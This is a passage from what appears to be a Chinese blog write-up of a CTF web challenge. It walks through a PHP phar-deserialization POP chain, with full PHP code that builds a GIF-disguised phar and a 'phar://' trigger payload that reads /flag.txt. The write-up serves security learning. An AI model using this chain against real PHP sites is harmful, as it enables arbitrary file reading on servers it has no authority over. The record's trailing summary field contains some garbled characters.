operator\">&amp;&amp;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$size</span> <span class=\"token operator\">/</span><span class=\"token operator\">=</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$size</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$units</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \t<span class=\"token shell-comment comment\"># 返回文件大小</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">detele</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 删除文件</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 返回文件内容</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<ul><li>基本排除sql注入</li><li>注意到两个魔术方法：<code>__call</code>、<code>__destruct</code>是危险的</li><li>最值得注意的是<code>File</code>类中的 <code>close()</code>方法，因为 <code>file_get_contents</code>往往会造成任意文件读取（而且这里出现这个非常突兀，整个网站都没出现文件内容呈现的功能），这里也是很危险的</li></ul>\n<p>index.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileList</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">Size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>看到index这里才清楚class中的奇怪的函数：</p>\n<ol><li>初始化<code>FileList</code>类，调用Name、Size方法</li><li>看到 <code>Filelist</code>中是不存在这两种方法的，于是调用了 <code>__call</code>魔术方法</li><li><code>__call</code>方法：<code>$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</code>results存储 <code>File</code>类对应方法的执行结果</li><li><code>最后当FileList</code>对象销毁时，调用 <code>__destruct</code>魔术方法，打印出结果</li></ol>\n<p>这里有魔术方法，联系到了反序列化；结合phar反序列化问题，明确该题目确实有phar利用条件：</p>\n<p>phar反序列化问题分析：<a href=\"https://paper.seebug.org/680/\">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>\n<ol><li> <p>有文件上传条件，可以上传phar文件</p> </li><li> <p>可利用函数<img alt=\"\" src=\"..\\..\\static\\image\\bcb7468d260b4c9eb6fde1ed4a701e41.png\"/> 题目中含有如 <code>unlink、file_get_contents、isdir、file_exists</code>等函数</p> </li><li> <p>文件操作函数的参数可控：upload.php中filename、delete.php中filename可控</p> </li><li> <p>题目对<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有过滤。</p> </li></ol>\n<p>POP利用链思路：</p>\n<ol><li>上传phar文件 \n  <ul><li>这里可以在upload上传文件，对于PHP，是以关键标识 <code>__HALT_COMPILER();?&gt;</code> 识别phar文件的，所以文件后缀对文件识别没有影响</li><li>改成 <code>gif/jpg/png</code> 后缀</li></ul> </li><li>后端触发反序列化 \n  <ul><li>upload.php中filename、delete.php中filename可控</li><li><code>unlink、file_get_contents、isdir、file_exists</code>这些函数在处理 phar文件时都会触发反序列化</li><li>但是注意到 <code>upload.php</code>中限制了访问目录，如果想读到限制目录外的其他目录是不行的，所以由 <code>delete.php</code>来触发</li></ul> </li><li>执行魔术方法、读取指定文件 \n  <ul><li>如果想要读取文件内容，<code>肯定要利用class.php</code>中的<code>File.close()</code>，但是没有直接调用这个方法的语句；</li><li>注意到 <code>User</code>类中在 <code>__destruct</code>时调用了<code>close()</code>，按原逻辑，<code>$db</code>应该是<code>mysqli</code>即数据库对象，但是我们可以构造<code>$db</code>指定为 <code>File</code>对象，这样就可以读取到文件了。</li><li>可读取到文件不能呈现给我们，注意到 <code>__call</code>魔术方法，这个魔术方法的主要功能就是，如果要调用的方法我们这个类中不存在，就会去<code>File</code>中找这个方法，并把执行结果存入 <code>$this-&gt;results[$file-&gt;name()][$func]</code>，刚好我们利用这一点：让 <code>$db</code>为 <code>FileList</code>对象，当 <code>$db</code>销毁时，触发 <code>__destruct</code>，调用<code>close()</code>，由于 <code>FileList</code>没有这个方法，于是去 <code>File</code>类中找方法，读取到文件，存入 <code>results</code></li></ul> </li><li>返回读取结果 \n  <ul><li><code>__destruct</code>正好会将 <code>$this-&gt;results[$file-&gt;name()][$func]</code>的内容打印出来</li></ul> </li></ol>\n<p>构造POP利用链：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">{<!-- --></span>\n    \t<span class=\"token keyword\">public</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">File</span> <span class=\"token punctuation\">{<!-- --></span>\n    \t<span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">FileList</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">private</span> <span class=\"token variable\">$results</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">private</span> <span class=\"token variable\">$funcs</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">results</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">funcs</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">filename</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'/flag.txt'</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 这里的flag.txt是多次猜测出来的</span>\n            <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">files</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$filelist</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$user</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token property\">db</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filelist</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"GIF89a\"</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//设置stub，增加gif文件头</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将自定义的meta-data存入manifest</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//添加要压缩的文件</span>\n    <span class=\"token comment\">//签名自动计算</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>生成phar文件：</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\a450f6d899cc428a9005dab0eadc3df3.png\"/></p>\n<p>改一下后缀上传：</p>\n<p><img alt=\" \" src=\"..\\..\\static\\image\\bd7a6a80e4b64f0d823c4428009bd852.png\"/></p>\n<p>抓取delete.php的数据包，修改post提交的数据：</p>\n<pre><code>filename=phar://phar.gif\n</code></pre>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\e0c3134cf6c84a3e9d1f74c40b05bc5f.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-03-11 13:30:10", "summary": "华北赛区反序列化经过测试，发现这里有个任意文件下载的漏洞，根据程序功能，下载到网站源码：在这里插入图片描述注意下本地环境：代码审计：娉唽鎴愬姛初始化对象长度小于，调用方法验证和"}